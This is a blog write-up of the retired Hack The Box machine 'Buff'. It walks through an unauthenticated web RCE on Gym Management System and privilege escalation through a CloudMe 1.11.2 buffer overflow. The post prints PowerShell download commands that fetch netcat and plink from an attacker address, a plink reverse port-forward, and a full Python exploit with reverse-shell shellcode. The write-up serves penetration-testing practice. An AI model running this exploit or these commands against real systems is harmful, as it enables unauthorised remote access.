---
id: 323
title: 'Writeup – Hack The Box Buff'
date: '2020-11-26T13:02:00+00:00'
author: admin
layout: post
guid: 'https://embed-me.com/?p=323'
permalink: /writeup-hack-the-box-buff/
wp_featherlight_disable:
    - ''
categories:
    - 'Hack the Box'
    - 'Penetration Testing'
tags:
    - buff
    - 'Hack The Box'
    - linux
    - 'Penetration Testing'
    - Pentesting
    - windows
---

## Intro

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_intro.png)

The following post will describe how I hacked the previously retired Buff Box. However, I am not an experienced Pentester, therefore take everything I say with a grain of salt. Now let’s have some fun with this nice Windows Box.

## Setup

First things first, we need to add the IP to /etc/hosts.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_hosts.png)

## Recon

As usual, we start by enumerating our target using [nmap](https://nmap.org/). This allows us to identify potential attack vectors.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_nmap.png)

We can already confirm that the box uses a Microsoft Windows operating system and runs an [Apache webserver](https://httpd.apache.org/).  
Using an ordinary browser, we are able to view the webpages content. There is not a lot that can be done, but the “Contact” menu at least allows us to identify that the site was build using “Gym Management Software”. When you introduce google with this search term, you already get a lot of vulnerabilities, so that sounds like a good starting point for us.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webpage.png)

## Exploit

Exploit-db has this nice unauthenticated [RCE for Gym Management System 1.0](https://www.exploit-db.com/exploits/48506). After verification of the exploit code (we never run any code we do not understand), we can safely use it to get an initial foothold into the target system.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webexploit.png)

That worked quite well. We are presented with a webshell and the user we have access too seems to be named “shaun”.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webexploit_whoami.png)

Even if the webshell is very limited and does not allow us to change directories, we are still able to access the user.txt file from our current location in order to get the first flag.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_webexploit_user_flag.png)

## Getting Root

In order to start our privilege escalation operation, we really need a something better than our webshell. Spawning a shell using python is not possible, since it is not installed on the windows system. However, we can still download something from within the target – namely netcat. So let’s start right away and download nc.exe from your attackers machine. Note that somebody else already uploaded nc, therefore we name our binary nc3.exe

``` bash
powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.202:8000/nc.exe','nc3.exe')
```

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_upload_nc.png)

In order for that to work, we have to start a local listener on our attacker machine.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_nc_reverse_shell2.png)

And finally connect to the local listener from your target machine. The remote shell is working and we do not use the limited webshell any longer.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_nc_reverse_shell.png)

In order to find a local vulnerability to expoit, I required help from Mr.Google. However, this is what I ended up doing:

Netstat for TCL and ports only listening on localhost are 3306 (MySQL) and 8888 which seems to be connected to service running by a CloudMe.exe.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_netstat.png)

We can find the binary in the “shaun’s” Download directory.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_cloudme.png)

Exploit-db provides exploits for multiple versions, however it seems like the suffix indicates that it is version 1.11.2.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_exploit_db.png)

I went with the simplest one – [CloudMe 1.11.2 – Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/48389). We can see that the code executes “calc.exe” as a Proof of Concept. In our case, we need to modify it to get a shell with the processes privileges. Therefore let’s use [msfvenom ](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)to generate an alternative payload that spawns a remote shell.

``` python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -p windows/shell_reverse_tcp LPORT=3000 LHOST=10.10.14.202 -f python -v payload
payload =  b""
payload += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
payload += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
payload += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
payload += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
payload += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
payload += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
payload += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
payload += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
payload += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
payload += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
payload += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
payload += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
payload += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
payload += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
payload += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
payload += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a"
payload += b"\x0e\xca\x68\x02\x00\x0b\xb8\x89\xe6\x6a\x10\x56"
payload += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
payload += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
payload += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
payload += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
payload += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
payload += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
payload += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
payload += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
payload += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
payload += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,8888))
    s.send(buf)
except Exception as e:
    print(sys.exc_value)
```

Since we need to execute the payload from the victim machine and there is no python installed, I tried to use pyinstaller.exe on windows to generate a binary from the python code to execute on the target, however, for whatever reason I was not successfully…

As an alternative, we can always perform a remote port forwarding from our target to the attacker machine. Since Windows does not have ssh installed per default, I decided to go with [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html). It allows port forwarding, it is small and we can upload it in the exact same way as the nc.exe before.

``` bash
powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.202:8000/plink.exe','plink3.exe')
```

However, I was not able to get the remote shell to connect. I tried everything, different payload, ports and even applications. I was quite frustrated when I learned that on HTB sometimes the default port (22) simply does not work…

**Pitfall 1:** Do not try to use Port 22 on HTB!

This is the approach that finally worked for me.

Change the default ssh port in “/etc/ssh/sshd\_config” to an alternative one. I used the port “1234”.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_remote_port_forwarding.png)

Next, restart the service, in order for the changes to take effect.

``` bash
sudo service ssh restart
```

On the target machine, start the plink application as follows in order to forward port 8888.

``` bash
plink3.exe -l kali -pw kali 10.10.14.202 -R 8888:127.0.0.1:8888 -P 1234
```

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_remote_port_forwarding2.png)

We can verify that port forwarding is now working, when we check our local sshd ports.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_remote_port_forwarding3.png)

When we ran the exploit locally, however, frustration is high, no remote shell… But why?

**Pitfall 2**: The exploit does only work once, then the machine needs to be reset!

After resetting the machine, the exploit worked and we are able to access root.txt.

![_config.yml]({{ site.baseurl }}/images/htb_buff/buff_root_flag.png)

Getting user was fun and I really enjoyed it, however, getting root was not that funny. Both pitfalls cost quite a lot of time to figure out and were not really part of the challenge. Nevertheless, another machine on the list. Bye!